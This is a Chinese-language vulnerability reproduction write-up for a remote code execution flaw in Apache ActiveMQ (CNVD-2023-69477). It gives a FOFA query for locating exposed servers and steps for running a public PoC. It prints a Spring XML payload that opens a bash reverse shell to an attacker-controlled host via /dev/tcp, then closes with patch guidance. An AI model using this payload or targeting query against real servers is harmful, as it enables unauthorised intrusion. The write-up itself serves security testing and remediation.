
# Apache ActiveMQ RCE漏洞复现（CNVD-2023-69477）

### 0x01 产品简介

  [ActiveMQ](https://so.csdn.net/so/search?q=ActiveMQ&spm=1001.2101.3001.7020)是一个开源的消息代理和集成模式服务器，它支持Java消息服务(JMS) API。它是Apache Software Foundation下的一个项目，用于实现消息中间件，帮助不同的应用程序或系统之间进行通信。

### 0x02 漏洞概述

 Apache ActiveMQ 中存在远程代码执行漏洞，Apache ActiveMQ在默认安装下开放了61616服务端口，而该端口并没有对传入数据进行适当的过滤，从而使攻击者能够构造恶意数据以实现远程代码执行。

### 0x03 影响范围

Apache ActiveMQ < 5.18.3

Apache ActiveMQ < 5.17.6

Apache ActiveMQ < 5.16.7

Apache ActiveMQ < 5.15.16 

### 0x04 复现环境

FOFA：app="APACHE-ActiveMQ" && port="61616"

![b1d19830b3eb42439cf5a379fdb8f821.png](assets/1698896344-a60ed524e71d9d8b6386cefd6307d3c0.png)

### 0x05 漏洞复现

PoC地址：[https://github.com/trganda/ActiveMQ-RCE](https://github.com/trganda/ActiveMQ-RCE "https://github.com/trganda/ActiveMQ-RCE")

把项目Get到本地，导入IDEA中运行

![74854985a16d47dfae882dd50decf702.png](assets/1698896344-754c63dfa808a0b1e179883c8ef8d7db.png)

 直接运行会发现报错：java: 警告: 源发行版 11 需要目标发行版 11

PS:这种一般是你idea的 配置文件iml 与 项目中 配置的jdk版本是不一致导致的

![6cbc9d691fe548ccbca9e68eb61b210d.png](assets/1698896344-df9cf1ffbe0f75f4b2ba39e24e800086.png)

这里需要安装jdk11，配置项目

![3a5ae44b65144c05bed9c8d823556339.png](assets/1698896344-1ed8523c71408467a21e57ac9cf5632a.png)

 **漏洞利用**

修改Main.java以下两处

![f48ef75660ff44cb9caa860d0ee83b35.png](assets/1698896344-3c6a9bd34c170bde0f05592ed7bb8c6b.png)

**反弹shell** 

将rce.xml，上传至vps

```cobol
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/your-ip/6666 0>&1]]></value>
          </list>
        </constructor-arg>
    </bean>
```

利用python开启http服务 

![79b958ad02784db9a00e76e8ee75a551.png](assets/1698896344-04047623af38bfd37a5df8e8833a3ace.png)

nc开启监听

![7d5fea03fec84a4b84b45b84922c4465.png](assets/1698896344-2f54dfe81d4a03e50e97f5c13c562390.png)

运行Main.java

![499c87a5b2c54c4997bf538ca9a717cf.png](assets/1698896344-c6a44a03c23e11bf05d0e26266c0e7d4.png)

成功反弹shell

![2618ec354d534345bbf22d0d8b813d8b.png](assets/1698896344-3955620b4068a2f0bf4e6820fdba4ed9.png)

### ![2adaf923474647acbfcde701749e153f.png](assets/1698896344-c86b60159ad981760d558468359e6df2.png)

### 0x06 修复建议 

**临时缓解方案**

通过网络ACL策略限制访问来源，例如只允许来自特定IP地址或地址段的访问请求。

**升级修复方案**

目前官方已通过限制反序列化类只能为Throwable的子类的方式来修复此漏洞。建议受影响用户可以更新到：

Apache ActiveMQ >= 5.18.3

Apache ActiveMQ >= 5.17.6

Apache ActiveMQ >= 5.16.7

Apache ActiveMQ >= 5.15.16

https://github.com/apache/activemq/tags
